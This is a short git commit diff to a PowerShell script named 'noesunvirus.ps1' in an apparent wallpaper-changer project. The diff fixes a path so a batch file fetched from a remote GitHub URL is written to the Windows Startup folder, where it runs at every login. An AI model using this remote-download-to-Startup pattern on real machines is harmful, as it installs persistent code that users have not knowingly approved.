586a2436132e68958406783b3cd113c0d0d4beba
notthecoolguyyouknow <9omxzzh1@duck.com>
2024-09-26 22:33:58 -0300

    Update noesunvirus.ps1

--- noesunvirus.ps1
+++ noesunvirus.ps1
@@ -1,7 +1,7 @@
 $scriptPath1 = "$env:userprofile\AppData\Local\Temp\noesunvirus.ps1"
 #$scriptPath2 = "$env:userprofile\Documents\noesunvirus.ps1"
 #$scriptPath3 = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\noesunvirus.ps1"
-$batFilePath = "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\start.bat"
+$batFilePath = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\start.bat"
 $batchUrl = "https://raw.githubusercontent.com/notthecoolguyyouknow/WallpaperChanger/main/start.bat"
 
 $startDelayEnabled = $false
